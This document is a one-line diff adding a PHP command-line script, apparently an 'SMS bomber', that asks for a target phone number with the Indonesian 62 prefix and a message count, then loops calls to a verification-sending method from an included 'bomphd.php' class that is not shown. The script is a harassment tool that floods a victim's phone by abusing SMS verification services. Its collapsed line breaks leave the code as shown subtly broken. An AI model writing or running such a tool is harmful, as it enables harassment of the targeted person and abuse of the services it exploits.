@@ -1,0 +1,1 @@
+<?phpinclude 'bomphd.php';/* https://github.com/nee48/BomSmsPhD Made by Chemod_zrd404 Pratama Modified by ManusiaBiasa*/$init = new Bom();//Eksekusi Sms Boomberecho "Nomor Target (pakai 62): ";$a = trim(fgets(STDIN));$init->no = "$a";echo "Jumlah Pesan: ";$b = trim(fgets(STDIN));$loop = "$b";for ($i=0; $i < $loop; $i++) { $init->Verif($init->no);}
